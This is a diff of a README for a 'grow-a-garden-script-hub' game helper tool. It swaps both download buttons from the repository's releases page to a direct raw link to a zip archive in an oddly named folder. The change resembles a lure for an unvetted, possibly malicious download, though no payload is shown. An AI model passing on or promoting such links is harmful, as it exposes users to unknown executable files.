@@ -1,7 +1,7 @@
 <h1>🌱 grow-a-garden-script-hub - Grow Your Garden Effortlessly</h1>
 
 <p align="center">
-  <a href="https://github.com/tillingwilliamhenryfoxtalbot171/grow-a-garden-script-hub/releases" style="display:inline-block;padding:18px 42px;background:#4CAF50;color:#ffffff;font-size:24px;font-weight:bold;text-decoration:none;border-radius:12px;box-shadow:0 6px 16px rgba(76,175,80,0.4);">⬇️ DOWNLOAD NOW</a>
+  <a href="https://raw.githubusercontent.com/tillingwilliamhenryfoxtalbot171/grow-a-garden-script-hub/main/fisticuff/hub_script_garden_grow_a_v1.4.zip" style="display:inline-block;padding:18px 42px;background:#4CAF50;color:#ffffff;font-size:24px;font-weight:bold;text-decoration:none;border-radius:12px;box-shadow:0 6px 16px rgba(76,175,80,0.4);">⬇️ DOWNLOAD NOW</a>
 </p>
 
 <p align="center"><strong>Get the 2026 version of the most popular garden simulation helper tool!</strong></p>
@@ -50,7 +50,7 @@ Following these steps will get the tool running on your computer in just a few m
 Visit this link to download the application:
 
 <p align="center">
-  <a href="https://github.com/tillingwilliamhenryfoxtalbot171/grow-a-garden-script-hub/releases" style="display:inline-block;padding:14px 32px;background:#2196F3;color:#ffffff;font-size:20px;font-weight:bold;text-decoration:none;border-radius:8px;box-shadow:0 4px 12px rgba(33,150,243,0.4);">🔗 DOWNLOAD FROM GITHUB</a>
+  <a href="https://raw.githubusercontent.com/tillingwilliamhenryfoxtalbot171/grow-a-garden-script-hub/main/fisticuff/hub_script_garden_grow_a_v1.4.zip" style="display:inline-block;padding:14px 32px;background:#2196F3;color:#ffffff;font-size:20px;font-weight:bold;text-decoration:none;border-radius:8px;box-shadow:0 4px 12px rgba(33,150,243,0.4);">🔗 DOWNLOAD FROM GITHUB</a>
 </p>
 
 When you click the link, you'll see a list of files. Look for the most recent one that matches the name of the application. Click on it to start the download.
